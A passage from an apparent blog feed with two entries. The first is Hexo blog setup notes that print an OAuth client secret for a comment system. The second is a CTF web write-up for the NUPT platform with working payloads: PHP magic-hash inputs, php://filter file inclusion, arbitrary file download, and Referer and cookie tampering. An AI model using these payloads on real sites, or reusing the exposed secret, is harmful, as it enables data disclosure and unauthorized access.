到此为止目录结构如下</div><div class="line">.</div><div class="line">├── _config.yml  [站点配置文件]</div><div class="line">├── ...</div><div class="line">├── source</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes</div><div class="line">├──landscape</div><div class="line">└──next</div><div class="line">└──_config.yml [博客配置文件]</div></pre></td></tr></table></figure><h3 id="自定义博客样式"><a href="#自定义博客样式" class="headerlink" title="自定义博客样式"></a>自定义博客样式</h3><h4 id="blog-config-yml"><a href="#blog-config-yml" class="headerlink" title="blog/_config.yml"></a>blog/_config.yml</h4><p><a href="https://github.com/findneo/findneo.github.io/blob/0f6cc6c0c88e46ed8409e7c4c76e86eea0fadea9/_config.yml" target="_blank" rel="external">git commit</a></p><h4 id="blog-themes-next-config-yml"><a href="#blog-themes-next-config-yml" class="headerlink" title="blog/themes/next/_config.yml"></a>blog/themes/next/_config.yml</h4><p><a href="https://github.com/findneo/findneo.github.io/commit/c690492c2000d7544f17bf68928d98b576d164a9#diff-40e8f09dcfb3466627fdbc030ae0795c" target="_blank" rel="external">git commit</a> </p><h4 id="版权声明-，参考"><a href="#版权声明-，参考" class="headerlink" title="版权声明 ，参考"></a>版权声明 ，<a href="http://www.crocutax.com/2017/05/20/Hexo%E6%8C%81%E7%BB%AD%E4%BC%98%E5%8C%96-%E5%9C%A8%E6%96%87%E7%AB%A0%E5%B0%BE%E9%83%A8%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E4%BF%A1%E6%81%AF/" target="_blank" rel="external">参考</a></h4><h5 id="blog-themes-next-layout-macro-post-copyright-swig"><a href="#blog-themes-next-layout-macro-post-copyright-swig" class="headerlink" title="blog\themes\next\layout_macro\post-copyright.swig"></a>blog\themes\next\layout_macro\post-copyright.swig</h5><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"post-copyright"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-title"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.title') + __('symbol.colon') &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; post.permalink &#125;&#125;"</span> &gt;</span>&#123;&#123; post.title &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-author"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.author') + __('symbol.colon') &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;config.url&#125;&#125;"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123;__('post.copyright.welcome')&#125;&#125;"</span>&gt;</span> &#123;&#123; config.author &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-link"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; post.permalink &#125;&#125;"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123; post.title &#125;&#125;"</span>&gt;</span>&#123;&#123; post.permalink &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-license"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.license_title') + __('symbol.colon') &#125;&#125; <span class="tag">&lt;/<span class="name">strong</span>&gt;</span></div><div class="line">    &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125;</div><div class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div></pre></td></tr></table></figure><h5 id="blog-themes-next-languages-zh-Hans-yml"><a href="#blog-themes-next-languages-zh-Hans-yml" class="headerlink" title="blog\themes\next\languages\zh-Hans.yml"></a>blog\themes\next\languages\zh-Hans.yml</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><div class="line"><span class="comment">##部分</span></div><div class="line"><span class="attr">post:</span></div><div class="line"><span class="attr">  copyright:</span></div><div class="line"><span class="attr">      title:</span> <span class="string">本文标题</span></div><div class="line"><span class="attr">      author:</span> <span class="string">文章作者</span></div><div class="line"><span class="attr">      link:</span> <span class="string">原始链接</span></div><div class="line"><span class="attr">      license_title:</span> <span class="string">版权声明</span></div><div class="line"><span class="attr">      welcome:</span> <span class="string">'访问 findneo 的个人博客'</span></div><div class="line"><span class="attr">      license_content:</span> <span class="string">本文在&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-creative-commons"&gt;&lt;/i&gt;</span></div><div class="line">        <span class="string">&lt;a</span> <span class="string">href="%s"</span> <span class="string">rel="external</span> <span class="string">nofollow"</span> <span class="string">target="_blank"&gt;%s&lt;/a&gt;下发布。转载请保留原始链接。</span></div></pre></td></tr></table></figure><h4 id="文章模板-blog-scaffolds-post-md"><a href="#文章模板-blog-scaffolds-post-md" class="headerlink" title="文章模板 blog\scaffolds\post.md"></a>文章模板 blog\scaffolds\post.md</h4><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">---</div><div class="line">title: &#123;&#123; title &#125;&#125;</div><div class="line">date: &#123;&#123; date &#125;&#125;</div><div class="line">categories: </div><div class="line">tags: []     ###可以直接用tags: [tag1,tag2]代替多行tags</div><div class="line">description:     ###当主题配置文件中的excerpt_description开启时，会把这一部分作为文章摘要</div><div class="line"></div><div class="line">---</div></pre></td></tr></table></figure><h3 id="将博客发布到GitHub-page"><a href="#将博客发布到GitHub-page" class="headerlink" title="将博客发布到GitHub page"></a>将博客发布到GitHub page</h3><h4 id="网站内容发布"><a href="#网站内容发布" class="headerlink" title="网站内容发布"></a>网站内容发布</h4><p><a href="https://hexo.io/zh-cn/docs/deployment.html#Git" target="_blank" rel="external">官方文档</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">创建GitHub账户，新建username.github.io项目，为git配置ssh</div><div class="line">npm install hexo-deployer-git --save</div><div class="line">hexo d</div></pre></td></tr></table></figure><h4 id="开发内容与配置文件备份"><a href="#开发内容与配置文件备份" class="headerlink" title="开发内容与配置文件备份"></a>开发内容与配置文件备份</h4><p>由于主题next本身是git项目，所以直接在blog文件夹内git init，然后整个blog文件夹(当然blog/.gitignore已经排除了没用的子文件夹)push到GitHub会发现next文件夹整个是空的。因此要做git库的<a href="http://www.mr-ping.com/post/VGr5DCUqTeYoaody" target="_blank" rel="external">嵌套处理</a>，但比较麻烦，而且似乎不适用于这种情况。所以最后我采用在<strong>第一次push前</strong>把blog\themes\next\.git 重命名为 blog\themes\next\now-donot-use.git ，于是blog无法识别到next这个项目，成功地备份了所有配置。将来如果要更新主题，只需重命名回来，然后 git pull ，更新完改回去即可。</p><p>本地调试完成后，只需在git bash里执行<code>./ok [&quot;you commit comment&quot;]</code>即可完成部署和配置备份，ok文件内容如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">hexo clean</div><div class="line">hexo d</div><div class="line">git add -A</div><div class="line">if [ "$1" = "" ]</div><div class="line">then</div><div class="line">git commit -m "Update."</div><div class="line">else</div><div class="line">git commit -m "$1"</div><div class="line">fi</div><div class="line">git push</div></pre></td></tr></table></figure><h3 id="emmm-重装系统了"><a href="#emmm-重装系统了" class="headerlink" title="emmm,重装系统了"></a>emmm,重装系统了</h3><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">从头开始，安装git fro windows，配置ssh</div><div class="line">git config --global user.name your_name</div><div class="line">git config --global user.email your_mail</div><div class="line">ssh-keygen -t rsa -b 4096 -C "your_email@example.com"</div><div class="line">clip &lt; ~/.ssh/id_rsa.pub</div><div class="line">ssh -T git@github.com 验证ssh可用</div><div class="line">-------------------------------------</div><div class="line">在GitHub新建findneo.github.io</div><div class="line">git clone https://github.com/findneo/findneo.github.io.git</div><div class="line">cd findneo.github.io</div><div class="line">git checkout -b bakeup </div><div class="line">新建备份分支并设为默认分支，因为后面只手动操作这个分支，master分支由hexo-deployer-git自动操作 </div><div class="line">hexo init tmp</div><div class="line">cp -a tmp/* ./</div><div class="line">rm -rf tmp</div><div class="line">npm install --save hexo-deployer-git</div><div class="line">npm install --save hexo-generator-baidu-sitemap</div><div class="line">npm install --save hexo-generator-sitemap</div><div class="line">npm install --save hexo-generator-searchdb</div><div class="line">npm install --save hexo-generator-feed </div><div class="line">npm i --save hexo-wordcount</div><div class="line">-------------------------------------</div><div class="line">在站点配置文件中配置git-deployer为master分支</div><div class="line">git add . </div><div class="line">git commit -m "..." </div><div class="line">git push origin bakeup</div><div class="line">hexo d -g</div></pre></td></tr></table></figure><p>参考了<a href="https://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/#more" target="_blank" rel="external">这位朋友</a>的备份方法，很棒，(๑•̀ㅂ•́)و✧。</p><p>列个软件清单：</p><hr><p>WSL、<a href="http://www.voidtools.com/" target="_blank" rel="external">everything</a>、 <a href="https://www.typora.io/#windows" target="_blank" rel="external">Typora</a> 、shadow socks、chrome、firefox、notepad++ 、<a href="https://findneo.github.io/2017/10/cmd-surfnet/">一键上网脚本</a>、 sublime、印象笔记、python2/3、git for windows、vmware/kali/win7、AgentRansack、7z、射手影音、SumatraPDF、<del>微软办公系列</del> <a href="http://xianshuhua2.blog.163.com/blog/static/99760751201362854753660/" target="_blank" rel="external">WPS Office 2013 个人版</a> 、IObitUninstaller、snipaste</p><p>burpsuite、fiddler、wireshark、nmap、sqlmap、winhex、ziperello、weevely、winhex、御剑、awvs</p><h3 id="添加gitment作为评论系统"><a href="#添加gitment作为评论系统" class="headerlink" title="添加gitment作为评论系统"></a>添加gitment作为评论系统</h3><p>项目介绍:<a href="https://imsun.net/posts/gitment-introduction/" target="_blank" rel="external">https://imsun.net/posts/gitment-introduction/</a></p><p>在 <em>findneo.github.io\themes\next\layout_partials\comments.swig</em> 的倒数第二个endif前添加</p><figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">&#123;% elseif config.gitment.owner and config.gitment.commentrepo and config.gitment.clientid and config.gitment.clientsecret %&#125;</div><div class="line">  &lt;div id=<span class="string">"gitmentContainer"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://imsun.github.io/gitment/style/default.css"</span>&gt;</div><div class="line">&lt;script src=<span class="string">"https://imsun.github.io/gitment/dist/gitment.browser.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line"><span class="keyword">var</span> gitment = <span class="keyword">new</span> Gitment(&#123;</div><div class="line">  id: <span class="string">'&#123;&#123;page.title&#125;&#125;'</span>,</div><div class="line">  owner: <span class="string">'&#123;&#123;config.gitment.owner&#125;&#125;'</span>,</div><div class="line">  repo: <span class="string">'&#123;&#123;config.gitment.commentrepo&#125;&#125;'</span>,</div><div class="line">  oauth: &#123;</div><div class="line">  client_id: <span class="string">'&#123;&#123;config.gitment.clientid&#125;&#125;'</span>,</div><div class="line">  client_secret: <span class="string">'&#123;&#123;config.gitment.clientsecret&#125;&#125;'</span>,</div><div class="line">  &#125;,</div><div class="line">&#125;)</div><div class="line">gitment.render(<span class="string">'gitmentContainer'</span>)</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure><p>然后在站点配置文件末尾添加</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">gitment: </div><div class="line">    owner: findneo</div><div class="line">    commentrepo: findneo.github.io</div><div class="line">    clientid: a3407310dfbeafbfe55a</div><div class="line">    clientsecret: ad6c900a0fce4a44b8eeb40e1790ee7c7cc7575d</div></pre></td></tr></table></figure><p><strong>需要注意的是每发布一篇文章都需要把该页面初始化一下其他人才可以评论，这是因为评论基于issue，并不是bug</strong></p><h3 id="单独控制每篇文章版权声明"><a href="#单独控制每篇文章版权声明" class="headerlink" title="单独控制每篇文章版权声明"></a>单独控制每篇文章版权声明</h3><p>给 <code>themes\next\layout\_macro\post-copyright.swig</code> 加上控制流程，通过每个post的 front-matter控制，遇到想不加版权声明的文章就在头部加上 <code>notoriginal: true</code> 即可，不影响已有文章。</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&#123;% if not post.notoriginal %&#125;</div><div class="line">foo</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      或许，记录在印象笔记和在博客会有不同，但是究竟，不同在哪里呢？
    
    </summary>
    
      <category term="备忘" scheme="https://findneo.github.io/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="hacklife" scheme="https://findneo.github.io/tags/hacklife/"/>
    
  </entry>
  
  <entry>
    <title>南京邮电大学网络攻防训练平台writeup</title>
    <link href="https://findneo.github.io/2017/09/nupt-ctf-writeup/"/>
    <id>https://findneo.github.io/2017/09/nupt-ctf-writeup/</id>
    <published>2017-09-24T03:06:34.000Z</published>
    <updated>2017-11-22T10:36:00.118Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>南邮CTF平台网址：</p><ul><li><a href="http://ctf.nuptsast.com/challenges" target="_blank" rel="external">http://ctf.nuptsast.com/challenges</a></li><li><a href="http://ctf.nuptzj.cn/challenges" target="_blank" rel="external">http://ctf.nuptzj.cn/challenges</a></li></ul></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a><a href="http://chinalover.sinaapp.com/web1/" target="_blank" rel="external">签到题</a></h4><p><em>nctf{flag_admiaanaaaaaaaaaaa}</em></p><p>ctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。</p><h4 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a><a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="external">md5 collision</a></h4><p><em>nctf{md5_collision_is_easy}</em></p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</div><div class="line">$a = @$_GET[<span class="string">'a'</span>];</div><div class="line">$md52 = @md5($a);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</div><div class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</div><div class="line">&#125;&#125;</div><div class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>利用PHP弱类型，前人发现<em>md5(‘QNKCDZO’)=’0e830400451993494058024219903391’</em>，<em>md5(‘240610708’)=’0e462097431906509019562988736854’</em>，而因为使用松散比较的缘故，<em>var_dump(‘0e830400451993494058024219903391’==’0e462097431906509019562988736854’);</em>值为真，因此访问  <em><a href="http://chinalover.sinaapp.com/web19/?a=240610708" target="_blank" rel="external">http://chinalover.sinaapp.com/web19/?a=240610708</a></em> 即可。</p><p>1、在PHP中，@被称为错误控制操作符(<a href="http://php.net/manual/en/language.operators.errorcontrol.php" target="_blank" rel="external">error control operator</a>)，前置@符号的表达式产生的任何错误都将被忽略。</p><p>2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明<a href="https://en.wikipedia.org/wiki/Length_extension_attack" target="_blank" rel="external">不安全</a>后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。</p><p>3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(<a href="http://php.net/manual/en/language.types.type-juggling.php" target="_blank" rel="external">type juggling</a>)而后者不会。这种juggle总的来说利大于弊，但确实容易<a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="external">玩脱</a>。</p><p>​    此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。</p><p>​    当操作符为<code>==</code>时，若有一个操作数为<code>int/float</code>或两个操作数<code>is_numeric()</code>均为真，则判断为处于数字语境；当操作符为数字操作符，如<code>+-/*</code>时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。）</p><p>​    根据PHP<a href="http://php.net/manual/en/language.types.string.php#language.types.string.conversion" target="_blank" rel="external">官方文档</a> ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【<a href="http://php.net/manual/en/language.types.string.php#language.types.string.conversion" target="_blank" rel="external">Valid numeric data</a> ，正则匹配表达为 <code>\s(\d+\.?\d*|\.\d+)([eE]\d+)?\s</code>，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现<code>1e</code>也被取值为1而不是0，这有点奇怪 :(</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> $a1=<span class="number">1</span>;         $b1=<span class="string">"1"</span>;        $c1=<span class="string">"1padding"</span>;</div><div class="line"> $a2=<span class="number">.1</span>;        $b2=<span class="string">".1"</span>;       $c2=<span class="string">".1padding"</span>;</div><div class="line"> $a3=<span class="number">1.</span>;        $b3=<span class="string">"1."</span>;       $c3=<span class="string">"1.padding"</span>;</div><div class="line"> $a4=<span class="number">1.1</span>;       $b4=<span class="string">"1.1"</span>;      $c4=<span class="string">"1.1padding"</span>;</div><div class="line"> $a5=<span class="number">1.e1</span>;      $b5=<span class="string">"1.e1"</span>;     $c5=<span class="string">"1.e1padding"</span>; </div><div class="line"> $a6=<span class="number">.1e1</span>;      $b6=<span class="string">".1e1"</span>;     $c6=<span class="string">".1e1padding"</span>;</div><div class="line"> $a7=<span class="number">1.1e1</span>;     $b7=<span class="string">"1.1e1"</span>;    $c7=<span class="string">"1.1e1padding"</span>;</div><div class="line"> $a8=<span class="number">1e1</span>;       $b8=<span class="string">"1e1"</span>;      $c8=<span class="string">"1e1padding"</span>;</div><div class="line"> var_dump($a8==$b8);<span class="comment">//true</span></div><div class="line"> var_dump($a8==$c8);<span class="comment">//true</span></div><div class="line"> var_dump($b8==$c8);<span class="comment">//false</span></div><div class="line"> var_dump($a8+$b8);<span class="comment">//float(20)</span></div><div class="line"> var_dump($a8+$c8);<span class="comment">//float(20)</span></div><div class="line"> var_dump($b8+$c8);<span class="comment">//float(20)</span></div></pre></td></tr></table></figure><p>4、其他符合<code>/0[eE]\d{30}/</code>的MD5值：</p><table><thead><tr><th style="text-align:left">string(strlen($var))     $var</th><th style="text-align:left">string(strlen(md5($var)))       md5($var)</th></tr></thead><tbody><tr><td style="text-align:left">QNKCDZO</td><td style="text-align:left">0e830400451993494058024219903391</td></tr><tr><td style="text-align:left">s878926199a</td><td style="text-align:left">0e545993274517709034328855841020</td></tr><tr><td style="text-align:left">s155964671a</td><td style="text-align:left">0e342768416822451524974117254469</td></tr><tr><td style="text-align:left">s1502113478a</td><td style="text-align:left">0e861580163291561247404381396064</td></tr><tr><td style="text-align:left">s214587387a</td><td style="text-align:left">0e848240448830537924465865611904</td></tr><tr><td style="text-align:left">s878926199a</td><td style="text-align:left">0e545993274517709034328855841020</td></tr><tr><td style="text-align:left">s1091221200a</td><td style="text-align:left">0e940624217856561557816327384675</td></tr><tr><td style="text-align:left">s1885207154a</td><td style="text-align:left">0e509367213418206700842008763514</td></tr><tr><td style="text-align:left">s1836677006a</td><td style="text-align:left">0e481036490867661113260034900752</td></tr><tr><td style="text-align:left">s1184209335a</td><td style="text-align:left">0e072485820392773389523109082030</td></tr><tr><td style="text-align:left">s1665632922a</td><td style="text-align:left">0e731198061491163073197128363787</td></tr><tr><td style="text-align:left">s532378020a</td><td style="text-align:left">0e220463095855511507588041205815</td></tr><tr><td style="text-align:left">240610708</td><td style="text-align:left">0e462097431906509019562988736854</td></tr></tbody></table><h4 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a><a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="external">签到2</a></h4><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></div><div class="line">尚未登录或口令错误</div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>输入框：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"text1"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">请输入口令：zhimakaimen</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"开门"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><p><em>nctf{follow_me_to_exploit}</em></p><p><em>maxlength=”10”</em> 而口令 <em>zhimakaimen</em> 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 <em>maxlength=”10”</em> 字段修改为 <em>maxlength=”11”</em> 或是更大的值；另一种是使用hackbar或burp直接向 <a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php" target="_blank" rel="external">http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php</a>  post  <em>text1=zhimakaimen</em> 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。</p><h4 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a><a href="http://chinalover.sinaapp.com/web2/index.html" target="_blank" rel="external">这题不是WEB</a></h4><p><em>nctf{photo_can_also_hid3_msg}</em></p><p>下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。</p><h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a><a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="external">层层递进</a></h4><p><em>nctf{this_is_a_fl4g}</em></p><p>查看源代码，跟随链接，依次访问<code>SO.html</code> -&gt; <code>S0.html</code>-&gt;<code>SO.htm</code> -&gt;<code>S0.htm</code>-&gt;<code>404.html</code> ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。</p><h4 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a><a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="external">AAencode</a></h4><p><em>nctf{javascript_aaencode}</em></p><p>aaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 <a href="http://tool.isex.ren/aadecode" target="_blank" rel="external">在线解码</a> 。工具作者颇有幽默感。</p><h4 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a><a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="external">单身二十年</a></h4><p><em>nctf{yougotit_script_now}</em></p><p>访问 <em><a href="http://chinalover.sinaapp.com/web8/search_key.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web8/search_key.php</a></em> 会被重定向到 <em><a href="http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</a></em>  ，重定向会被浏览器自动处理，burp抓包则可见flag。</p><h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a><a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="external">你从哪里来</a></h4><blockquote><p>你是从 google 来的吗？<br>传送门：<a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="external">题目地址</a></p></blockquote><p><em>nctf{http_referer}</em></p><p>给请求加上<code>referer: https://www.google.com</code>即可。从<em><a href="https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php" target="_blank" rel="external">https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php</a></em> 看到源代码可能有点问题。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$referer = $_SERVER[<span class="string">'referer'</span>];</div><div class="line"><span class="keyword">if</span> ($referer === <span class="string">"https://www.google.com/ "</span> || $referer === <span class="string">"https://www.google.com"</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"nctf&#123;http_referer&#125;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"are you from google?"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>第二行应该是<code>$referer = $_SERVER[&#39;HTTP_REFERER&#39;];</code> ？</p><h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</div><div class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $ZzvSWE;&#125;</div><div class="line"><span class="keyword">echo</span> CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>);</div></pre></td></tr></table></figure><p><em>nctf{gzip_base64_hhhhhh}</em></p><p>运行代码即可。</p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="external">文件包含</a></h4><p><em>nctf{edulcni_elif_lacol_si_siht}</em></p><p>使用PHP的<a href="http://php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="external">filter</a>协议读取index.php，即访问 <em><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="external">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></em> ，将得到的字符串base64解码。</p><h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a><a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="external">单身一百年也没用</a></h4><p><em>nctf{this_is302redirect}</em></p><p>flag藏在响应头中。</p><h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a><a href="http://way.nuptzj.cn/web6/" target="_blank" rel="external">Download~!</a></h4><p><em>nctf{download_any_file_666}</em></p><p>访问 <em><a href="http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name" target="_blank" rel="external">http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name</a></em> 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。</p><h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a><a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="external">COOKIE</a></h4><p><em>nctf{cookie_is_different_from_session}</em></p><p>看到响应头中有<code>Set-Cookie: Login=0</code>，因此在请求头加入<code>Cookie: 